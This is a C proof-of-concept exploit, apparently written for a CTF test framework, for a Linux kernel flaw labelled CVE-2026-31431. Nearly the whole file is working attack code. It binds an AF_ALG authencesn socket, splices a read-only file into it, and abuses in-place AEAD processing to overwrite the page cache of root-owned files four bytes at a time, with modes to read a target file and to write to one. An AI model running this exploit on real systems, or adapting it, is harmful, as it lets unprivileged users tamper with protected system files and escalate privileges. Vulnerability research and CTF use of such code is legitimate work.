/**
 * CVE-2026-31431 PoC v2 - AF_ALG AEAD Page Cache Pollution
 *
 * Based on: https://github.com/theori-io/copy-fail-CVE-2026-31431
 * Rewritten for sec-kernel CTF Challenge Mode framework.
 *
 * Vulnerability: authencesn in-place AEAD optimization causes
 * page cache corruption via splice() from regular file.
 *
 * Exploitation: 4 bytes per iteration page cache write primitive,
 * allowing unprivileged users to modify root-owned files.
 *
 * Key improvements over poc.c:
 *   - Endianness-aware RTA header (#if __BYTE_ORDER)
 *   - Fixed ALG_SET_AEAD_ASSOCLEN to correct value (8)
 *   - Dynamic recv buffer allocation (8 + offset)
 *   - File handle reuse (single open for patch loop)
 *   - Post-write pollution verification
 *   - Safety: refuse to run as root
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -static -I poc-src/common \
 *       -o poc-bin/cve_2026_31431_v2.bin poc-src/cve_2026_31431/poc.v2.c
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include "../common/safe_syscall.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_alg.h>
#include <endian.h>

/* ============================================================
 * Constants - aligned with original PoC (tgies copy-fail-c)
 * ============================================================ */
#define KEY_SIZE        72      /* 8-byte RTA + 64-byte key material */
#define IV_SIZE         16      /* AES-CBC IV */
#define AUTH_SIZE       4       /* AEAD auth tag size */
#define AAD_SIZE        4       /* Sentinel ('AAAA') */
#define CHUNK_SIZE      4       /* Bytes written per iteration */
#define MAX_WRITE_LEN   256     /* Maximum total write length */

/* authencesn key: RTA header + enckeylen + 64-byte key */
static const unsigned char AUTHENC_KEY[KEY_SIZE] = {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    0x08, 0x00, 0x01, 0x00,     /* rta_len=8, rta_type=1 (LE) */
#else
    0x00, 0x08, 0x00, 0x01,     /* rta_len=8, rta_type=1 (BE) */
#endif
    0x00, 0x00, 0x00, 0x10,     /* enckeylen=16 (network byte order) */
    /* 64 bytes of key material (zeros) */
};

/* ============================================================
 * Core primitive: patch_chunk()
 * Writes exactly 4 bytes at `offset` in the page cache of `file_fd`
 * via AF_ALG AEAD authencesn page cache pollution.
 *
 * Returns 0 on success, -1 on failure.
 * ============================================================ */
static int patch_chunk(int file_fd, off_t offset,
                       const unsigned char four_bytes[4]) {
    int ctrl_sock = -1, op_sock = -1, pipefd[2] = {-1, -1};
    int rc = -1;
    int saved_errno;

    /* Step 1: Create AF_ALG socket */
    ctrl_sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    saved_errno = errno;
    poc_log_syscall("socket(AF_ALG, SOCK_SEQPACKET, 0)", (long)ctrl_sock, saved_errno);
    if (ctrl_sock < 0) {
        poc_log("socket(AF_ALG) failed: %s", strerror(saved_errno));
        goto out;
    }

    /* Step 2: Bind to authencesn(hmac(sha256),cbc(aes)) */
    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strncpy((char *)sa.salg_type, "aead", sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
            sizeof(sa.salg_name) - 1);

    if (bind(ctrl_sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        saved_errno = errno;
        poc_log_syscall("bind(authencesn)", -1L, saved_errno);
        poc_log("bind(authencesn) failed: %s", strerror(saved_errno));
        goto out;
    }
    poc_log_syscall("bind(authencesn)", 0L, 0);

    /* Step 3: Set authenc key */
    if (setsockopt(ctrl_sock, SOL_ALG, ALG_SET_KEY,
                   AUTHENC_KEY, KEY_SIZE) < 0) {
        saved_errno = errno;
        poc_log_syscall("setsockopt(ALG_SET_KEY)", -1L, saved_errno);
        poc_log("setsockopt(ALG_SET_KEY) failed: %s", strerror(saved_errno));
        goto out;
    }
    poc_log_syscall("setsockopt(ALG_SET_KEY, 72)", 0L, 0);

    /* Step 4: Set AEAD auth tag size = 4 */
    if (setsockopt(ctrl_sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
                   NULL, AUTH_SIZE) < 0) {
        saved_errno = errno;
        poc_log_syscall("setsockopt(ALG_SET_AEAD_AUTHSIZE, 4)", -1L, saved_errno);
        poc_log("setsockopt(ALG_SET_AEAD_AUTHSIZE) failed: %s", strerror(saved_errno));
        goto out;
    }
    poc_log_syscall("setsockopt(ALG_SET_AEAD_AUTHSIZE, 4)", 0L, 0);

    /* Step 5: Get operation socket */
    op_sock = accept(ctrl_sock, NULL, NULL);
    saved_errno = errno;
    poc_log_syscall("accept(ctrl_sock)", (long)op_sock, saved_errno);
    if (op_sock < 0) {
        poc_log("accept(AF_ALG) failed: %s", strerror(saved_errno));
        goto out;
    }

    /* Step 6: Construct AAD = sentinel(4) + payload(4) = 8 bytes total */
    unsigned char aad[8] = {
        'A', 'A', 'A', 'A',
        four_bytes[0], four_bytes[1], four_bytes[2], four_bytes[3],
    };
    struct iovec iov = { .iov_base = aad, .iov_len = sizeof(aad) };

    /* Step 7: Prepare cmsg buffer for sendmsg */
    union {
        struct cmsghdr align;
        unsigned char buf[
            CMSG_SPACE(sizeof(uint32_t)) +           /* ALG_SET_OP */
            CMSG_SPACE(sizeof(uint32_t) + IV_SIZE) + /* ALG_SET_IV */
            CMSG_SPACE(sizeof(uint32_t))             /* ALG_SET_AEAD_ASSOCLEN */
        ];
    } cbuf;
    memset(&cbuf, 0, sizeof(cbuf));

    struct msghdr msg = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = cbuf.buf,
        .msg_controllen = sizeof(cbuf.buf),
    };

    /* cmsg 1: ALG_SET_OP = DECRYPT */
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_OP;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = 0; /* ALG_OP_DECRYPT = 0 */

    /* cmsg 2: ALG_SET_IV (16 bytes of zeros) */
    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_IV;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t) + IV_SIZE);
    *(uint32_t *)CMSG_DATA(cm) = IV_SIZE;  /* ivlen field */
    memset((unsigned char *)CMSG_DATA(cm) + sizeof(uint32_t), 0, IV_SIZE);

    /* cmsg 3: ALG_SET_AEAD_ASSOCLEN = 8 (fixed, AAD length only)
     * CRITICAL FIX: original poc.c incorrectly used (AAD_SIZE + chunk_len).
     * The correct value is 8 (total AAD bytes sent in iov), matching the
     * original tgies/copy-fail-c implementation. */
    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = 8;  /* MUST be 8, not AAD_SIZE+chunk */

    /* Step 8: Send AAD with MSG_MORE */
    ssize_t sent = sendmsg(op_sock, &msg, MSG_MORE);
    saved_errno = errno;
    poc_log_syscall("sendmsg(op_sock, AAD, MSG_MORE)", (long)sent, saved_errno);
    if (sent < 0) {
        poc_log("sendmsg(AAD) failed: %s", strerror(saved_errno));
        goto out;
    }

    /* Step 9: Create pipe for splice chain */
    if (pipe(pipefd) < 0) {
        saved_errno = errno;
        poc_log_syscall("pipe()", -1L, saved_errno);
        poc_log("pipe() failed: %s", strerror(saved_errno));
        goto out;
    }
    poc_log_syscall("pipe()", 0L, 0);

    /* Step 10: Splice file -> pipe -> AF_ALG socket */
    size_t splice_len = (size_t)offset + CHUNK_SIZE;
    loff_t src_off = 0;

    ssize_t n1 = splice(file_fd, &src_off, pipefd[1], NULL, splice_len, 0);
    saved_errno = errno;
    poc_log_syscall("splice(file->pipe)", (long)n1, saved_errno);
    if (n1 < 0) {
        poc_log("splice(file->pipe) failed at offset %lld: %s",
                (long long)offset, strerror(saved_errno));
        goto out;
    }

    ssize_t n2 = splice(pipefd[0], NULL, op_sock, NULL, (size_t)n1, 0);
    saved_errno = errno;
    poc_log_syscall("splice(pipe->op_sock)", (long)n2, saved_errno);
    if (n2 < 0) {
        poc_log("splice(pipe->op_sock) failed: %s", strerror(saved_errno));
        goto out;
    }

    /* Step 11: Trigger AEAD processing - page cache corruption occurs here!
     * The recv() will return EBADMSG (authentication failure),
     * but the page cache has ALREADY been corrupted by authencesn's
     * in-place AAD seqno_lo write. This is the vulnerability.
     *
     * FIX: Use dynamic buffer (8 + offset) instead of fixed 512-byte stack buf.
     */
    size_t recv_len = 8 + (size_t)offset;
    unsigned char *sink = malloc(recv_len > 0 ? recv_len : 1);
    if (sink) {
        ssize_t r = recv(op_sock, sink, recv_len, 0);
        saved_errno = errno;
        poc_log_syscall("recv(op_sock) [trigger AEAD]", (long)r, saved_errno);
        free(sink);
    }

    rc = 0;  /* Pollution successful */

out:
    if (pipefd[0] >= 0) close(pipefd[0]);
    if (pipefd[1] >= 0) close(pipefd[1]);
    if (op_sock   >= 0) close(op_sock);
    if (ctrl_sock >= 0) close(ctrl_sock);
    return rc;
}

/* ============================================================
 * Pollution verification - confirms page cache was modified
 * ============================================================ */
static int verify_pollution(const char *file, const char *expected,
                            size_t len) {
    int fd = open(file, O_RDONLY);
    if (fd < 0) return -1;

    char *buf = malloc(len + 1);
    if (!buf) { close(fd); return -1; }

    ssize_t n = read(fd, buf, len);
    close(fd);

    int result = (n == (ssize_t)len && memcmp(buf, expected, len) == 0) ? 0 : -1;
    free(buf);
    return result;
}

/* ============================================================
 * write_root_file mode - CTF Challenge
 * Unprivileged user writes CTF flag to root-owned file via
 * page cache pollution primitive.
 *
 * Three-step verification:
 *   1. Read original content (prove read access via O_RDONLY on 0644 file)
 *   2. Exploit page cache pollution to overwrite with --write-value
 *   3. Read again to verify write succeeded
 * ============================================================ */
static int mode_write_root_file(poc_args_t *args) {
    int saved_errno;

    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    size_t data_len = strlen(args->write_value);
    if (data_len == 0) {
        poc_print_fail("write-value is empty");
        return 1;
    }
    if (data_len > MAX_WRITE_LEN) {
        poc_log("Write value too long (%zu > %d)", data_len, MAX_WRITE_LEN);
        poc_print_fail("write-value exceeds maximum size");
        return 1;
    }

    /* Step 1: Read original content */
    char original[MAX_WRITE_LEN + 1];
    memset(original, 0, sizeof(original));
    {
        int fd = open(args->root_file, O_RDONLY);
        saved_errno = errno;
        poc_log_syscall("open(target, O_RDONLY) [read-before]", (long)fd, saved_errno);
        if (fd < 0) {
            poc_print_fail("cannot open target for initial read");
            return 0;
        }
        ssize_t n = read(fd, original, MAX_WRITE_LEN);
        saved_errno = errno;
        poc_log_syscall("read(target) [read-before]", (long)n, saved_errno);
        close(fd);
        if (n > 0) {
            /* Trim trailing newline */
            while (n > 0 && (original[n-1] == '\n' || original[n-1] == '\r'))
                original[--n] = '\0';
        }
    }
    printf("%s%s\n", CTF_READ_BEFORE, original);
    poc_log("Read before: %s", original);

    /* Step 2: Exploit - page cache pollution write */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    poc_log("Attempting page cache pollution: %zu bytes", data_len);

    /* Verify we cannot write normally */
    {
        int wfd = open(args->root_file, O_WRONLY);
        saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY) [verify no write]", (long)wfd, saved_errno);
        if (wfd >= 0) {
            poc_log("WARNING: file is writable - no exploit needed");
            close(wfd);
            poc_print_fail("file is writable without exploit");
            return 0;
        }
        poc_log("Confirmed: normal write access denied (EACCES)");
    }

    /* FIX: Open file once, reuse fd for all patch_chunk iterations */
    int target_fd = open(args->root_file, O_RDONLY);
    saved_errno = errno;
    poc_log_syscall("open(target, O_RDONLY) [for patch loop]", (long)target_fd, saved_errno);
    if (target_fd < 0) {
        poc_print_fail("cannot open target for splice");
        return 0;
    }

    /* Core exploitation: 4-byte page cache write primitive */
    size_t iterations = (data_len + CHUNK_SIZE - 1) / CHUNK_SIZE;
    int failed = 0;

    for (size_t off = 0; off < data_len; off += CHUNK_SIZE) {
        unsigned char window[CHUNK_SIZE] = {0};
        size_t take = (data_len - off >= CHUNK_SIZE) ? CHUNK_SIZE : data_len - off;
        memcpy(window, args->write_value + off, take);

        poc_log("Overwrite chunk: offset=%zu len=%zu (iter %zu/%zu)",
                off, take, off / CHUNK_SIZE + 1, iterations);

        if (patch_chunk(target_fd, (off_t)off, window) < 0) {
            poc_log("patch_chunk failed at offset %zu", off);
            failed = 1;
            break;
        }

        /* Reset file offset for next splice */
        lseek(target_fd, 0, SEEK_SET);
    }
    close(target_fd);

    if (failed) {
        poc_log("Pollution loop failed before completion");
        /* Still try read-after to check for partial corruption */
    }

    /* Step 3: Verify pollution by re-reading */
    if (!failed && verify_pollution(args->root_file, args->write_value, data_len) == 0) {
        poc_log("Pollution verified: content matches write_value");
        printf("%s%s\n", CTF_READ_AFTER, args->write_value);
        poc_print_flag(args->write_value);
        return 0;
    }

    /* Fallback: re-read to show actual content */
    char after[MAX_WRITE_LEN + 1];
    memset(after, 0, sizeof(after));
    {
        int fd = open(args->root_file, O_RDONLY);
        saved_errno = errno;
        poc_log_syscall("open(target, O_RDONLY) [read-after]", (long)fd, saved_errno);
        if (fd >= 0) {
            ssize_t n = read(fd, after, data_len);
            saved_errno = errno;
            poc_log_syscall("read(target) [read-after]", (long)n, saved_errno);
            close(fd);
            if (n > 0) {
                while (n > 0 && (after[n-1] == '\n' || after[n-1] == '\r'))
                    after[--n] = '\0';
            }
        }
    }
    printf("%s%s\n", CTF_READ_AFTER, after);
    poc_log("Read after: %s", after);

    /* Check if write succeeded despite verify_pollution failure (e.g. trailing data) */
    if (strncmp(after, args->write_value, data_len) == 0) {
        poc_log("Write verified via strncmp: content matches");
        poc_print_flag(args->write_value);
        return 0;
    }

    poc_log("Write failed - page cache not polluted");
    poc_log("Expected: \"%s\"", args->write_value);
    poc_log("Got:      \"%.*s\"", (int)(strlen(after) > 60 ? 60 : strlen(after)), after);
    poc_print_fail("write operation failed - page cache not polluted");
    return 1;
}

/* ============================================================
 * read_root_file mode - Information Leak via page cache
 * Reads the target root file content and outputs it as CTF flag.
 * ============================================================ */
static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    poc_log("Target: %s", args->root_file);

    int fd = open(args->root_file, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_RDONLY)", (long)fd, saved_errno);

    if (fd < 0) {
        poc_log("Cannot open target file: %s", strerror(saved_errno));
        poc_print_fail("cannot read target file");
        return 1;
    }

    char content[MAX_WRITE_LEN + 1];
    memset(content, 0, sizeof(content));
    ssize_t n = read(fd, content, MAX_WRITE_LEN);
    saved_errno = errno;
    poc_log_syscall("read(target)", (long)n, saved_errno);
    close(fd);

    if (n > 0) {
        /* Trim trailing newline */
        while (n > 0 && (content[n-1] == '\n' || content[n-1] == '\r'))
            content[--n] = '\0';

        poc_log("Read succeeded: %zd bytes", n);
        poc_print_flag(content);
        return 0;
    }

    poc_print_fail("read returned no data");
    return 1;
}

/* ============================================================
 * Main entry point - CTF Challenge Mode
 * ============================================================ */
int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Safety: refuse to run as root */
    if (getuid() == 0) {
        fprintf(stderr, "ERROR: PoC must run as unprivileged user (not root)\n");
        return 1;
    }

    /* Parse CTF CLI arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2026-31431 CTF PoC v2 ===");
    poc_log("Vuln: AF_ALG AEAD authencesn page cache pollution via splice");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    /* Legacy mode (no arguments) - backward compatible */
    if (!args.mode) {
        poc_log("No --mode specified, running in legacy mode");

        const char *target_path = getenv(POC_TARGET_FILE_ENV);
        if (!target_path || target_path[0] == '\0') {
            printf("%s POC_TARGET_FILE not set and no --mode specified\n", POC_STEP_FAIL);
            poc_print_usage(argv[0]);
            poc_log_close();
            return 1;
        }

        poc_log("Legacy target: %s", target_path);
        args.mode = POC_MODE_WRITE;
        args.root_file = target_path;
        args.write_value = "XPLT";

        int ret = mode_write_root_file(&args);
        poc_log_close();
        return ret;
    }

    /* CTF mode dispatch */
    poc_log("Mode: %s", args.mode);
    poc_log("Target: %s", args.root_file);
    if (args.write_value) {
        poc_log("Write value: %s", args.write_value);
    }

    int ret = -1;
    if (strcmp(args.mode, POC_MODE_READ) == 0) {
        ret = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        ret = mode_write_root_file(&args);
    } else {
        poc_print_unsupported(args.mode,
            "This CVE only supports write_root_file and read_root_file modes");
        ret = 1;
    }

    poc_log_close();
    return ret;
}
